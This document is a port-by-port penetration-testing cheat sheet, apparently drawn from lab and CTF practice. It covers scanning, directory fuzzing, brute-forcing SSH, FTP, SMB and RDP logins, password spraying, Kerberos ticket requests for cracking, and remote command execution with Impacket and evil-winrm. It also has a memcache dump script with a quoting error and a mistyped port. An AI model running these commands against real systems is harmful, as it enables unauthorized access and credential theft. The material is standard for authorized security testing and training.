# External-Enumeration

##  NMAP

#### Silent mode
```
nmap -sS -sV -vv -Pn -p<PORT> <IP>
```
#### Agressive mode
```
nmap -T4 -sS -A -p- <IP>
```
#### UDP Scan
```
nmap -T4 -sUV <IP>
```
#### List the nmap script
```
ls -l /usr/share/nmap/scripts/smb*
```

## Fuzzing

#### Knockpy - Subdomain fuzzing
```
knockpy domain.com -w /usr/share/wordlists/list --silent csv -o /path/to/new/folder

usage: knockpy [-h] [-v] [--no-local] [--no-remote] [--no-scan] [--no-http] 
               [--no-http-code CODE [CODE ...]] [--dns DNS] [-w WORDLIST] 
               [-o FOLDER] [-t SEC] [-th NUM] [--silent [{False,json,json-pretty,csv}]]
               domain
```

#### Dirb
```
dirb http://10.0.0.1/abc/ /usr/share/wordlists/dirb/big.txt  
```
#### Gobuster
```
gobuster dir -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/common.txt -e -t 20
gobuster dir -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/big.txt -t 30 -e -k -x .html,.php,.asp,.aspx,.htm,.xml,.json,.jsp,.pl

➤ Error: the server returns a status code that matches the provided options for non existing urls. https://10.0.0.1 => 200 (Length: 1474).
   Solution - exclude the specific length :  --exclude-length [size]
   Example : gobuster -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/common.txt -e -t 20 --exclude-length 1474

➤ Error: the server returns a status code that matches the provided options for non existing urls. https://10.0.0.1 => 401 (Length: 98).
   Solution - exclude the 401 status code : -b 404,401
   Example : gobuster -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/common.txt -e -t 20 -b 404,401
```


## Vulnerability scanner
```
nikto -host=http://example.com
```

## Online enumeration tools
```
https://dnsdumpster.com/
https://search.censys.io/
https://crt.sh/
https://archive.org/
https://www.robtex.com/
```

## Port 21
#### Vuln detection using nmap
```
nmap -p 21 -sV -sC --script="ftp-vuln-*, ftp-anon" 10.0.0.1-254
```
#### Hydra - Bruteforcing
```
hydra -s 21 -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ftp
```

#### Basic Connection and FTP commands
```
➤ Connection
ftp 10.0.0.1 21

➤ Upload a file (from the folder where the shell has been started)
binary
put <filename>

➤ Download a file (to the folder where the shell has been started)
binary
get <filename>
```

## Port 22
#### Hydra - Bruteforcing
```
hydra -s 22 -v -t 4 -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh
```

#### SSH connection
```
ssh lexis@10.0.0.1
ssh lexis@10.0.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### SSH connection error
```
ssh lexis@10.0.0.1
lexis@10.0.0.1's password:
Last login: Thu Feb 24 08:42:29 2022 from 192.168.1.1
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@                      E R R O R                      @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The .bash_profile file for the server you are attempting to
connect to has encountered an error. This could mean that
your access has been disabled. Please contact a system
administrator to restore your access to this server.
Connection  to 10.0.0.1

ssh -t lexis@10.0.0.1 /bin/sh
lexis@10.0.0.1's password:
sh-05$
```

## Port 25
#### Basic connection
```
telnet 10.0.0.1 25
Trying 10.0.0.1
Connected to 10.0.0.1.
Escape character is '^]'.
220 mail.local ESMTP Postfix (Debian/GNU)
```

#### Manual user enumeration
```
VRFY {username}

➤ Valid username
252 2.0.0 useradm

➤ Invalid username
550 5.1.1 <admin>: Recipient address rejected:User unknown in local recipient table
```

## Port 80
```
wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token {token-api}
```

## Port 110
## Port 111
```
rpcinfo -p 10.0.0.1
rpcclient -U "" 10.0.0.1
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```


## Port 139, 445
#### Basic enumeration
```
enum4linux -a 10.0.0.1
```

#### List nmap scripts - Detection vuln port 445,139
```

nmap -p 445,139 -Pn --script smb-protocols.nse 10.0.0.1
nmap -v -p 139,445 --script=smb-os-discovery 10.0.0.1

nmap -v -p 139,445 --script=smb* 10.0.0.1

nmap -p 445,139 -Pn --script=smb-vuln-*.nse 10.0.0.1 // Do not return all vuln because some script needs specific args
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.0.0.1
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.0.0.1

```

#### Connection attempt
```
smbclient -L \\10.0.0.1
smbclient -L 10.0.0.1 -U anonymous
smbclient -L 10.0.0.1 --options='client min protocol=NT1'
```

#### SMBmap List the rights on the folders / recursif mode
```
smbmap -H 10.0.0.1

➤ Reculsive enumeration
smbmap -H 10.0.0.1 -R

➤ Recursive enumeration on a specific folder
smbmap -H 10.0.0.1 -R 'Replication\active.htb'

➤ Authenticated enumeration
smbmap -H 10.0.0.1 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R

➤ Download a file
smbmap -H 10.10.0.1 --download '.\Users\SVC_TGS\Desktop\user.txt'

➤ If error ‘[!] Authentication error on 10.0.0.1’ try with a fake user -u ‘123’
smbmap -H 10.0.0.1 -R -u ‘123’
```

#### Detection of the SMB version using Wireshark
```
If the following error appear "protocol negotiation failed : NT_STATUS_CONNECTION_DISCONNECTED", it's probably due to the old smb version of the victim.
Solution: Intercept the trafic of the command ‘smbclient -L \\<IP> with wireshark and search the negotiation of the smb version.
```

#### Access through the kali folder
```
smb://<ip>/<folder>
```
#### Mount a share folder
```
mount -t cifs //10.0.0.1/share /mnt/share
mount -t cifs -o "username=user,password=password" //10.0.0.1/share /mnt/share
```

#### Bruteforce
```
hydra -L users.txt -P passs.txt smb://10.0.0.1 -t 4
hydra -L username.txt -P password.txt 10.0.0.1 smb -V
```

#### Password Spraying
```
crackmapexec smb <IP> -d <DOMAIN> -u users.txt -p 'PASSWORD'
→ EX: crackmapexec smb 10.0.0.1 -d frabricorp -u users.txt -p '123Soleil'

STATUS_PASSWORD_MUST_CHANGE : correct password but has expired and needs to be changed before logging in
STATUS_LOGIN_FAILURE : incorrect password
```


## Port 143
## Port 389

#### Without user account
```
➤ Anonymous connection attempt (-x). With the example test.com : DOMAIN = test and DOMAIN2 = com
ldapsearch -h 10.129.136.235 -p 389 -x -b "dc=htb,dc=local"   

➤ Enumerate all AD users (https://github.com/ropnop/windapsearch)
./windapsearch.py -d test.com --dc-ip 10.0.0.1 -U

➤ Enumerate all objects in the domain
./windapsearch.py -d test.com --dc-ip 10.0.0.1 --custom "objectClass=*" 
CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
The service alfresco needs Kerberos pre-authentication to be disabled. This means that we can request the encrypted TGT for this user. 

➤ Request a TGT ticket
./GetNPUsers.py DOMAIN/USERNAME -dc-ip <IP> -no-pass

➤ Next steps: Crack the obtained TGT ticket then used is again port 5985 using evil-winrm
```

#### With user account
```   
➤ Authenticated research. With the example test.com : DOMAIN = test and DOMAIN2 = com
ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
OR
./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
→ EX: ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
OR
windapsearch.py -u "DOMAIN\USERNAME" --dc-ip <IP> -U
→ EX: ./windapsearch.py -u "FABRICORP\harry" --dc-ip 10.10.10.193 -U

➤ Verify if a SPN exist
ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'password' -b "dc=domain,dc=com" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
OR
./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
→ EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1
→ OUTPUT: active/CIFS:445 -> a SPN exist

➤ Request a SPN token
./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP> -request
→ EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1 -request

➤ Wmiexec equivalent to psexec
./wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
→ EX: ./wmiexec.py domain.com/administrator:password@10.0.0.1
```


## Port 587
## Port 1433
#### Basic connection using sqsh
```
sqsh -U sa -P password -S 10.0.0.1:1433 -D mydb
```
#### Obtain a pretty output
```
go -m pretty
```
#### Execute command trough sqsh
#### Activate xp_cmdshell


## Port 3389

#### Nmap - Scan vuln
```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.0.0.1
```
#### Bruteforce 
```
hydra -L user.txt -P pass.txt 10.0.0.1 rdp
ncrack -vv --user administrator -P passwords.txt rdp://10.0.0.1,CL=1
```
#### Remote Desktop
```
rdesktop 10.0.0.1
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
```

## Port 5672 - AMQP

#### Enumeration using nmap
```
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info 10.0.0.1
```

#### Enumeration script
```
import amqp

conn = amqp.connection.Connection(host="10.0.0.1", port=5672, virtual_host="/")
conn.connect()
for k,v in conn.server_properties.items():
    print(k,v)
```

## Port 5985

#### login remotely over WinRM (using TGT ticket as example)

https://github.com/Hackplayers/evil-winrm

```
ruby evil-winrm.rb -i <IP> -u <USERNAME> -p <PASSWORD>
OR
gem evil-winrm
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD>
```

## Port 11211 - Memcache

#### Nmap enumeration
```
nmap -n -sV --script memcached-info -p 11211 10.0.0.1
```

#### Manual enumeration
```
echo "version" | nc -vn -w 1 <IP> 11211      #Get version
echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
echo "stats slabs" | nc -vn -w 1 <IP> 11211  #Get slabs
echo "stats items" | nc -vn -w 1 <IP> 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info
```

#### Extraction data script
```
➤ Install and use memcdump
mencdump --verbose --debug --servers=10.0.0.1 | tee keys.lst

➤ Execute the script
#!/bin/bash

file="keys.lst" #file which contains the keys
while read -r line
do
    echo "get $line | nc -vn -w 1 10.0.0.1 112111 > $line.txt
done < $file
```

## Port 15672 - RabbitMQ
```
The default credentials are guest:guest
```
